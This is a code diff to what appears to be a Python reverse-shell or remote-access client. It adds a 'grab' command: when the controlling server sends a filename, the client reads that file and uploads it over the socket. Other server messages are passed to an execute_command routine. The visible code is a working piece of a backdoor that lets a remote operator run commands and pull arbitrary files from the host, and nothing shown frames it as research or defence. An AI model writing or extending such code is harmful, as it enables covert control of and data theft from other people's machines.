@@ -101,6 +101,41 @@ def listen_to_server(conn):
                         progress.update(len(bytes_read))
                 progress.close()
                 f.close()
+            
+            elif msg[:4] == "grab":
+                filename = recieve_msg(client)
+                print(f'Filename: {filename}')
+
+                try:
+                    filesize = os.path.getsize(filename)
+                except:
+                    snd_msg(client, f"Couldn't open {filename}.")
+                    continue
+                
+                snd_msg(client, f"SUCCESS")
+                snd_msg(client, f"{filename}{SEPARATOR}{filesize}")
+
+                progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+                bytes_left = filesize 
+
+                with open(filename, 'rb') as f:
+                    while bytes_left > 0:
+                        # read the bytes from the file
+                        if bytes_left > BUFFER_SIZE:
+                            bytes_to_read = BUFFER_SIZE
+                        else:
+                            bytes_to_read = bytes_left
+                        bytes_read = f.read(bytes_to_read)
+                        bytes_left = bytes_left - bytes_to_read
+                        # we use sendall to assure transimission in
+                        # busy networks
+                        client.sendall(bytes_read)
+                        # update the progress bar
+                        progress.update(len(bytes_read))
+                progress.close()
+                f.close()
+
+
             else:
                 execute_command(conn, msg)
     conn.close()
